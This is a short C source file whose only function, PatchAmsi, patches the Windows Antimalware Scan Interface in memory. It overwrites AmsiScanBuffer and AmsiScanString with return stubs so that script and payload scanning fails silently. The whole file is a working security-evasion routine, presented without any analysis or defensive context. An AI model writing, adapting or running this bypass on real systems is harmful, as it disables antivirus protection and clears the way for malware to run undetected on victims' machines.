#include <windows.h>

void PatchAmsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    // AmsiScanBuffer
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer) {
        DWORD oldProtect;
        VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
        BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}; // mov eax, 0x80070057; ret
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
    }

    // AmsiScanString
    FARPROC pAmsiScanString = GetProcAddress(hAmsi, "AmsiScanString");
    if (pAmsiScanString) {
        DWORD oldProtect;
        VirtualProtect(pAmsiScanString, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
        BYTE patch[] = {0x31, 0xC0, 0xC3}; // xor eax,eax; ret
        memcpy(pAmsiScanString, patch, sizeof(patch));
        VirtualProtect(pAmsiScanString, 6, oldProtect, &oldProtect);
    }
}